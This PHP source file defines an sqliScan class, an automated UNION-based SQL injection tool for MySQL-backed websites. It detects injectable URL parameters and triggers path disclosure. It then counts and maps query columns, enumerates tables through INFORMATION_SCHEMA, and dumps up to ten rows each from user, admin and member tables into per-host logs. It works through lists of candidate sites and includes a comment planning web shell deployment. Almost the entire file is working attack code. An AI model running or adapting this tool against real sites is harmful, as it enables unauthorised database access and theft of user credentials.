<?php

class sqliScan extends scanner
{

    /**
     * Tests a single URL for SQL injection and data retrieval
     *
     * @access Public
     * @param String The URL to test
     * @param String The name of the log file to record results to
     * @param String The name of the swap file to record the current host being scanned
     * @return void
     */
    public function scanUrl($candidate, $logFile, $swapFile)
    {
        $website = new stdClass;

        echo "\n\n".str_repeat('*', 60);

        echo "\n\nScanning $siteNumber of $listCount :: $candidate";

        ftruncate($swapFile, 0);

        fwrite($swapFile, $candidate);

        $this->updateLogs($logFile, $candidate, 'a+');

        // attempnt to get injection point
        $injectionPoint = $this->detectInjectionPoint($candidate);

        if (!$injectionPoint) {
            return;
        }

        echo "\n\nInjection Point: $injectionPoint";

        $website->injectionPoint = $injectionPoint;

        // now check for path disclosure on injection point parameter
        $pathDisclosureUrl = $this->convertInjectionPoint($injectionPoint);

        // attempt to get the document root of the website
        $webRoot = $this->getWebRoot($pathDisclosureUrl);

        $website->documentRoot = $webRoot;

        if ($webRoot) {
            echo "\n\nDocument Root: ".$website->documentRoot."\n\n";
        }

        // get number of columns returned in query
        $numberColumns = ($this->binary_search($injectionPoint, range(1, 51), 1, 51, 'self::cmp') * -1) - 1;

        if (!$numberColumns) {
            return;
        }

        echo "\n\nNumber Columns: $numberColumns";

        $website->numberColumns = $numberColumns;

        // find out which columns are reflected
        $reflectedColumns = $this->getReflectedColumns($injectionPoint, $numberColumns);

        if (!$reflectedColumns) {
            return;
        }

        echo "\n\nReflected Columns: \n\n";
        print_r($reflectedColumns);

        $website->reflectedColumns = implode(',', $reflectedColumns);

        // get mysql version, database name, and current mysql user
        $dbVersion = end(
            $this->retrieveData(
                $injectionPoint,
                'version(),0x7c,database(),0x7c,user()',
                $numberColumns,
                $reflectedColumns
            )
        );

        @list($dbVersion, $dbName, $dbUser) = explode('|', $dbVersion);

        echo "\n\nDatabase Version: $dbVersion";
        echo "\n\nDatabase Name: $dbName";
        echo "\n\nDatabase User: $dbUser";

        $website->dbVersion = $dbVersion;

        // TODO: do not continue if MySql version too low to have information_schema tables

        // get list of tables
        $website->tablesList = $this->getTables($injectionPoint, $numberColumns, $reflectedColumns);

        echo "\n\nTables Retrieved:";

        print_r($website->tablesList);

        // do any table names contain 'user' keyword
        $website->userTables = preg_grep("/(user|admin|member)/i", $website->tablesList);

        // if so, get columns of these tables
        $website->userTablesColumns = $this->getColumns(
            $injectionPoint,
            $numberColumns,
            $reflectedColumns,
            $dbName,
            $website->userTables
        );

        // then get get dump
        $website->tabulatedData  = $this->getDumpTabulated(
            $injectionPoint,
            $dbName,
            $numberColumns,
            $reflectedColumns,
            $website->userTables,
            $website->userTablesColumns
        );

        foreach ($website->tabulatedData as $tableName => $table) {
            echo "\n\n$tableName\n\n";
            echo "$table";
        }

        // TODO: attempt to deploy a web shell

        // write contents of website object to buffer
        ob_start();
        print_r($website);
        $logData = ob_get_contents();
        ob_end_clean();

        $urlData = parse_url($candidate);

        $logData = str_replace('stdClass Object', $urlData['host'], $logData);
        $logData = str_replace('Array', '', $logData);

        // dump buffer contents to log file
        $this->updateLogs($logFile, $logData, 'a+');

        // record separate logfile for this site
        $this->updateLogs("logs/{$urlData['host']}.txt", $logData, 'w');
    }

    /**
     * Gets a list of all the tables in the active schema
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param Integer The number of columns in the query that is being injected into
     * @param Array The list of columns whose values populate parts of the webpage
     * @return Array An ordered list of table names
     */
    public function getTables($injectionPoint, $numberColumns, $reflectedColumns)
    {
        $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = database() GROUP BY table_schema';

        // first get the table count do we know how many results to expect
        $tablesCount = $this->retrieveData($injectionPoint, 'COUNT(table_name)', $numberColumns, $reflectedColumns, $qualifier);

        $tablesCount = (is_array($tablesCount)) ? end($tablesCount) : $tablesCount;

        echo "\n\nTables Count: $tablesCount";

        $tablesList = $this->retrieveData(
            $injectionPoint,
            'GROUP_CONCAT(table_name SEPARATOR 0x7c)',
            $numberColumns,
            $reflectedColumns,
            $qualifier
        );

        $tablesList = (is_array($tablesList)) ? end($tablesList) : $tablesList;

        $tables = explode('|', $tablesList);

        // group_concat has a limit of 1024 characters by default, which may not give us all our tables
        // if we have not retrieved all the tables we know are there then repeat in descending order
        if (count($tables) < $tablesCount) {
            echo "\n\nMore Tables Retrieved:\n\n";

            $tablesList = $this->retrieveData(
                $injectionPoint,
                'GROUP_CONCAT(table_name ORDER BY 1 DESC SEPARATOR 0x7c)',
                $numberColumns,
                $reflectedColumns,
                $qualifier
            );

            $tablesList = (is_array($tablesList)) ? end($tablesList) : $tablesList;
            $moreTables = explode('|', $tablesList);
            $lastTable = array_pop($tables);
            $firststTable = array_pop($moreTables);
            $mergedTables = array_merge($tables, array_reverse($moreTables));
            $tables = array_values(array_unique($mergedTables));
        }

        // if we haven't retrieved the full table list with the above three requests,
        // then we will need to retieve each table in the list, one by one...
        if (count($tables) < $tablesCount) {
            $tables = array();
            $i = 2;
            $tableName = array(reset($tables));
            while (is_array($tablesList) && !empty($tableName) && $i < 100) {
                $qualifier = ' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = database()'
                            .' AND table_name NOT IN ('.implode($tablesList).') LIMIT '.$i.', 1';

                $tableName = $this->retrieveData($injectionPoint, 'table_name', $numberColumns, $reflectedColumns, $qualifier);
                if (!empty($tableName)) {
                    $tables[] = reset($tableName);
                }
                $i++;
            }
        }

        return $tables;
    }

    /**
     * Gets a list of all the tables in the active schema
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param Integer The number of columns in the query that is being injected into
     * @param Array The list of columns whose values populate parts of the webpage
     * @param String The name of the DB Schema to target
     * @param Array The list of tables containing the string pattern 'user'
     * @return Array An ordered list of table names
     */
    public function getColumns($injectionPoint, $numberColumns, $reflectedColumns, $dbName, $userTables)
    {
        $columnsList = array();

        if (!empty($userTables)) {
            foreach ($userTables as $tableName) {
                echo "\n\nGetting columns for table: $tableName\n";

                // next line: qualifier not being reset (i.e. Limit 9,1)
                // also - may need to cast as char
                // e.g. SELECT CAST(CONCAT(0x444253545254,COUNT(column_name),0x4442454e44) AS CHAR(255)),2,3

                $qualifier = ' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x'
                            .self::strToHex($dbName)." AND table_name = 0x".self::strToHex($tableName);

                //echo "\n$qualifier\n";

                $columnsCount = $this->retrieveData(
                    $injectionPoint,
                    'COUNT(column_name)',
                    $numberColumns,
                    $reflectedColumns,
                    $qualifier
                );

                $columnsCount = (is_array($columnsCount)) ? end($columnsCount) : $columnsCount;

                echo "\nNumber of Columns: $columnsCount\n\n";

                $columnList = $this->retrieveData(
                    $injectionPoint,
                    'column_name',
                    $numberColumns,
                    $reflectedColumns,
                    $qualifier
                );

                $columns = array_unique($columnList);

                print_r($columns);

                if (count($columns) < $columnsCount) {
                    $columns = array();
                    $i = 0;
                    $columnName = array(reset($columns));
                    
                    while ($i <= $columnsCount) {
                        $qualifier = ' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x'.self::strToHex($dbName)
                                    ." AND table_name = 0x".self::strToHex($tableName)." LIMIT $i, 1";
                        
                        $columnName = $this->retrieveData(
                            $injectionPoint,
                            'column_name',
                            $numberColumns,
                            $reflectedColumns,
                            $qualifier
                        );

                        if (!empty($columnName)) {
                            $columns[] = reset($columnName);
                        }
                        $i++;
                    }
                    print_r($columns);
                }

                $columnsList[$tableName] = $columns;
            }
        }

        return $columnsList;
    }

    /**
     * Dumps data from user tables
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param String The name of the DB Schema to target
     * @param Integer The number of columns in the query that is being injected into
     * @param Array The list of columns whose values populate parts of the webpage
     * @param Array The list of tables containing the string pattern 'user'
     * @param Array A two-dimensional array of tables and columns
     * @return Array The tabulated data dump of each user table
     */
    public function getDumpTabulated($injectionPoint, $dbName, $numberColumns, $reflectedColumns, $userTables, $columnsList)
    {
        $tabulatedData = array();

        if (!empty($userTables)) {
            foreach ($userTables as $tableName) {
                echo "\n\nDumping table $tableName:";

                // first get count
                $rowCount = $this->getDump(
                    $injectionPoint,
                    $dbName,
                    $numberColumns,
                    $reflectedColumns,
                    $tableName,
                    $columnsList[$tableName],
                    true
                );

                $rowCount = (is_array($rowCount)) ? end($rowCount) : $rowCount;

                $rowCount = str_replace(',', '', $rowCount);

                echo "\n\nNumber of records: $rowCount";

                $info = $this->getDump(
                    $injectionPoint,
                    $dbName,
                    $numberColumns,
                    $reflectedColumns,
                    $tableName,
                    $columnsList[$tableName]
                );

                $data = array_unique($info);

                echo "\n\nRow Count: ".count($data)." - ".$rowCount."\n\n";

                $rowCount = ($rowCount > 10) ? 10 : $rowCount;

                if (count($data) < $rowCount) {
                    $buffer = array();
                    for ($i=1; $i<=$rowCount; $i++) {
                        $record = $this->getDump(
                            $injectionPoint,
                            $dbName,
                            $numberColumns,
                            $reflectedColumns,
                            $tableName,
                            $columnsList[$tableName],
                            false,
                            $i
                        );

                        $recordDump = (is_array($record)) ? reset($record) : $record;
                        if ($recordDump) {
                            $buffer[] = $recordDump;
                        }
                    }
                    $data = $buffer;
                }

                if (!empty($data)) {
                    $tabulatedData[$tableName] = $this->tabulateData($columnsList[$tableName], $data);
                }
            }
        }

        return $tabulatedData;
    }

    /**
     * Get a complete dump of a given table within the database
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param String The name of the DB Schema to target
     * @param Integer The number of columns in the query that is being injected into
     * @param Array The list of columns whose values populate parts of the webpage
     * @param String The name of the DB table to target
     * @param Array The list of each of the column names in the target table
     * @return Array Each row of the table, in CSV format
     */
    public function getDump($url, $dbName, $numberColumns, $reflectedColumns, $tableName, $columnsList, $getRowCount = false, $limit = 0)
    {
        $query = '';
        $paramInserted = false;

        for ($i=1; $i<=$numberColumns; $i++) {
            if (in_array($i, $reflectedColumns) && !$paramInserted) {
                if ($getRowCount) {
                    $query .= "CONCAT_WS(0x2c,0x444253545254,COUNT(1),0x4442454e44),";
                } else {
                    $query .= "CONCAT_WS(0x2c,0x444253545254,";
                    foreach ($columnsList as $column) {
                        $query .= $column.',';
                    }
                    $query .= "0x4442454e44),";
                }
                $paramInserted = true;
            } else {
                $query .= $i.',';
            }
        }

        $injectionPair = split("'", $url);

        $query = rtrim($query, ',')." FROM $dbName.$tableName";

        $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

        $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND FALSE UNION SELECT';

        if ($limit) {
            $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND FALSE UNION SELECT';
            $query .= " LIMIT $limit, 1";
        }

        $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $query, end($injectionPair));

        //echo "\n\n$testUrl\n\n";

        $encodedUrl = preg_replace('/\s/', '%20', $testUrl);
        
        $pageContents = $this->runQuery($encodedUrl);

        $columnsList = preg_match_all("/DBSTRT(.*?)DBEND/", $pageContents, $data);
        
        return $data[1];
    }

    /**
     * Format the table in a human readable, tabulated grid
     *
     * @access Public
     * @param Array The list of each of the column names in the target table
     * @param Array Each row of the table, in CSV format
     * @return String The data formatted in a human readable grid
     */
    public function tabulateData($headers, $data)
    {
        if (empty($data)) {
            return false;
        }

        $numberColumns = count($headers);

        $columnSizes = $tableData = array();

        $headerRow = array(implode(',', $headers));

        $data = array_merge($headerRow, $data);

        // iterate through each row of each column, and get the longest string length of each column
        foreach ($data as $row) {
            $rowData = explode(',', trim($row, ','));
            $tableData[] = $rowData;
            $rowLength = count($rowData);

            for ($i=0; $i<$rowLength; $i++) {
                $columnSizes[$i] = (isset($columnSizes[$i]) && $columnSizes[$i] > strlen($rowData[$i]))
                                ? $columnSizes[$i]
                                : strlen($rowData[$i]);
            }
        }

        $output = '';
        $borderDone = false;
        $border = '+-';

        // use this for padding each printed value
        foreach ($tableData as $row) {
            $output .= '| ';

            for ($i=0; $i<$numberColumns; $i++) {
                $output .= ' '.str_pad($row[$i], $columnSizes[$i], ' ').' |';
                if (!$borderDone) {
                    $border .= str_repeat('-', $columnSizes[$i]+2).'+';
                }
            }

            $borderDone = true;
            $output .= "\n";
        }

        $output = substr_replace($output, "\n".$border, strlen($border), 0);

        $returnString = "\n$border\n$output$border\n\n";

        return $returnString;
    }

    /**
     * Builds a injected query into our target URL
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param String The actual data we want to select
     * @param Integer The number of columns returned from the query we're inject into
     * @param Array Which columns have their values printed on the page
     * @param Array The qualifying section of the injected query, table to target, conditions etc.
     * @return String The encoded URL containing our injected query
     */
    public function buildQuery($url, $param, $numberColumns, $reflectedColumns, $queryQualifier = '')
    {
        $query = '';
        $paramInserted = false;

        for ($i=1; $i<=$numberColumns; $i++) {
            if (in_array($i, $reflectedColumns) && !$paramInserted) {
                $query .= "CONCAT(0x444253545254,$param,0x4442454e44),";
                $paramInserted = true;
            } else {
                $query .= $i.',';
            }
        }

        $injectionPair = split("'", $url);

        $query = rtrim($query, ',').$queryQualifier;

        $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

        $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'AND 1 = 0 UNION SELECT';

        $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $query, end($injectionPair));

        $encodedUrl = preg_replace('/\s/', '%20', $testUrl);

        return $encodedUrl;
    }

    /**
     * Returns a comma delineated list of column in the specified table
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param String The name of the active schema
     * @param Integer The number of columns returned from the query we're inject into
     * @param Array Which columns have their values printed on the page
     * @param String the name of the table who column names we want
     * @return String the comaa delineated list of column names for the given table
     */
    public function retrieveData($url, $param, $numberColumns, $reflectedColumns, $qualifier = '')
    {
        $url = $this->buildQuery($url, $param, $numberColumns, $reflectedColumns, $qualifier);
        
        $pageContents = $this->runQuery($url);

        $queryResult = preg_match_all("/DBSTRT(.*?)DBEND/", $pageContents, $data);
        
        return $data[1];
    }

    /**
     * Determines which columns values reflected in the markup of the page
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param Integer The number of columns returned from the query we're inject into
     * @return Array the list of column numbers that are present on the page
     */
    public function getReflectedColumns($url, $numberColumns)
    {
        $nonces = $this->getNonces($numberColumns);

        $injectionPair = split("'", $url);

        $encodedNonces = '';

        foreach ($nonces as $nonce) {
            $encodedNonces .= '0x'.self::strToHex($nonce).',';
        }

        $encodedNonces = rtrim($encodedNonces, ',');

        $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

        $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').' AND 1 = 0 UNION SELECT';

        $testUrl = sprintf('%s%s %s -- %s', reset($injectionPair), $injectionStart, $encodedNonces, end($injectionPair));

        $encodedUrl = preg_replace('/\s/', '%20', $testUrl);

        $pageContents = $this->runQuery($encodedUrl);

        $reflectedColumnsList = array();

        for ($i=1; $i<count($nonces); $i++) {
            if (strpos($pageContents, $nonces[$i-1]) !== false) {
                $reflectedColumnsList[] = $i;
            }
        }

        return $reflectedColumnsList;
    }

    /**
     * Returns a list of random strings which used to 'book-end' results so they can be scraped from the markup
     *
     * @access Public
     * @param Integer the number of columns in the query we are injecting into
     * @return Array The list of reflected columns
     */
    public function getNonces($numberColumns)
    {
        $nonces = array();

        for ($i=0; $i<$numberColumns; $i++) {
            $nonces[] = $this->randomString(6);
        }

        return $nonces;
    }

    /**
     * Ascertains the document root of the website or absolute path to the script
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @return String The path to the document root of the website
     */
    public function getWebRoot($url)
    {
        //echo "\n\nChecking for path disclosure...";
        $pageContents = $this->runQuery($url);
        
        $styledWarning = "/<b>Warning<\/b>:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in <b>(.+?)<\/b> on line <b>\d+<\/b>/";
        $plainWarning = "/Warning:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in (.+?) on line \d+/";

        preg_match($styledWarning, $pageContents, $styledMatch);
        preg_match($plainWarning, $pageContents, $plainMatch);

        $paths = array_merge($styledMatch, $plainMatch);
        
        if (!empty($paths)) {
            $systemPath = substr($paths[1], 0, strrpos($paths[1], '/')).'/';

            return $systemPath;
        }

        return false;
    }

    /**
     * Detects if a given URL is susceptible to injection, and where the injection point is
     *
     * @access Public
     * @param String The URL we are interested in testing
     * @return String The URL with an apostrophe marking the injectable parameter
     */
    public function detectInjectionPoint($candidate)
    {
        $testUrls = $this->makeOptions($candidate);

        if ($testUrls) {
            foreach ($testUrls as $option) {
                $option = rtrim($option, '_');
                if ($this->checkError($option)) {
                    return $option;
                }
            }
        }

        return false;
    }

    /**
     * Extraploates a list of URL tests for testing each parameter in a given URL
     *
     * @access Public
     * @param String The URL we want to test
     * @param Boolean If set to true, wil create test URLs for disclosing system path
     * @return Array the list of test URLs
     */
    public function makeOptions($url, $pathDisclose = false)
    {
        $parts = parse_url(rtrim($url));

        if (isset($parts['query'])) {
            $queryString = $parts['query'];
        } else {
            return false;
        }

        parse_str($queryString, $pairs);

        $options = array();

        foreach ($pairs as $key => $value) {
            $buffer = "{$parts['scheme']}://{$parts['host']}{$parts['path']}?";
            foreach ($pairs as $subKey => $subValue) {
                $buffer .= ($key == $subKey) ? "$subKey=$subValue'&" : "$subKey=$subValue&";
            }
            $options[] = rtrim($buffer, '&');
        }

        return $options;
    }

    /**
     * Converts a URL with an apostrophe that indicates an injection, 
     * to a URL with square brackets, which may reveal system path
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @return String The converted URL
     */
    public function convertInjectionPoint($url)
    {
        $injectionPair = split("'", $url);

        $pathDisclosureUrl = substr($injectionPair[0], 0, strrpos($injectionPair[0], "=")).'[]'
                            .substr($injectionPair[0], strrpos($injectionPair[0], "=")).$injectionPair[1];

        return $pathDisclosureUrl;
    }

    /**
     * Injects an 'order by' qualifier to determine the number of columns the executing query
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @param Integer The column number to try to sort by
     * @return String The URL to use for testing the number of columns available
     */
    public function getColumnCount($url, $column)
    {
        $injectionPair = split("'", $url);

        $injectableParam = substr($injectionPair[0], strrpos($injectionPair[0], '=')+1, strlen($injectionPair[0]));

        $injectionStart = ((is_numeric($injectableParam)) ? ' ' : '\' ').'ORDER BY';

        $columnCountUrl = sprintf('%s%s %d -- %s', reset($injectionPair), $injectionStart, $column, end($injectionPair));

        $encodedUrl = preg_replace('/\s/', '%20', $columnCountUrl);

        return $encodedUrl;
    }

    /**
     * Given a URL, will determine if the URL will trigger an error on the page
     * used for detecting injection point, web root etc.
     *
     * @access Public
     * @param String The URL to hit, the injection point is indicated with an apostrophe
     * @return Boolean True if a specific type of error was detected on the page
     */
    public function checkError($url)
    {
        $pageContents = $this->runQuery($url);
        
        $errorMessage = 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use';
        $styledWarning = "/<b>Warning<\/b>:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in <b>(.+?)<\/b> on line <b>\d+<\/b>/";
        $plainWarning = "/Warning:\s+\w+\(\) expects parameter 1 to be resource, \w+ given in (.+?) on line \d+/";
        $wrongNumberColumns = 'The used SELECT statements have a different number of columns';
        $unknownColumn = 'Unknown column';

        preg_match($styledWarning, $pageContents, $styledMatch);
        preg_match($plainWarning, $pageContents, $plainMatch);

        $merged = array_merge($styledMatch, $plainMatch);

        //echo "\n\nPAGE CONTENTS:\n\n$pageContents\n\n";

        if (strpos($pageContents, $errorMessage) !== false
            || strpos($pageContents, $unknownColumn) !== false
            || strpos($pageContents, $wrongNumberColumns) !== false
            || !empty($merged)) {
            return true;
        }
        return false;
        
        return (strpos($pageContents, $errorMessage) !== false || !empty($merged));
    }

    /**
     * Generates a random string
     *
     * @access Public
     * @param Integer The length of the random string to generate
     * @return String A random sequence of alphanumeric characters
     */
    public function randomString($strLen = 32)
    {
        // Create our character arrays
        $chrs = array_merge(range('a', 'z'), range('A', 'Z'), range(0, 9));

        // Just to make the output even more random
        shuffle($chrs);

        // Create a holder for our string
        $randStr = '';

        // Now loop through the desired number of characters for our string
        for ($i=0; $i<$strLen; $i++) {
            $randStr .= $chrs[mt_rand(0, (count($chrs) - 1))];
        }

        return $randStr;
    }
}